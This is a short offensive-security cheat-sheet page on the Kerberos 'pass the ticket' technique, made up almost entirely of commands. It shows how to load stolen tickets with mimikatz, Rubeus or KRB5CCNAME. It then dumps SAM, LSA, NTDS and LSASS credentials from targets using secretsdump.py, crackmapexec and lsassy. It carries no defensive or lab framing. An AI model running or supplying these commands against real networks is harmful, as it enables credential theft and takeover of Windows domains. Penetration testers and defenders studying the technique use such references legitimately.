---
description: >-
  A ticket can then be used to authenticate to a system using Kerberos without
  knowing any password. This is called Pass the ticket.
---

# Pass the ticket

Once a ticket is obtained/created, it needs to be referenced in the `KRB5CCNAME` environment variable for it to be used by others tools.

## Import tickets

#### Linux

```bash
export KRB5CCNAME=$path_to_ticket.ccache
```

#### Windows&#x20;

```bash
# With mimikatz

# use a .kirbi file
kerberos::ptt $ticket_kirbi_file

# use a .ccache file
kerberos::ptt $ticket_ccache_file

# With Rubeus
Rubeus.exe ptt /ticket:"base64 | file.kirbi"
```

## Pass the ticket

#### Linux

```bash
# dump hashes and LSA secrets from a machine.
secretsdump.py -k $TARGET

# dump credentials from specific locations 
crackmapexec smb $TARGETS -k --sam
crackmapexec smb $TARGETS -k --lsa
crackmapexec smb $TARGETS -k --ntds

# With Lsassy, dump credentails. They use different methods. 
# https://github.com/Hackndo/lsassy
crackmapexec smb $TARGETS -k -M lsassy
crackmapexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
lsassy -k $TARGETS
```

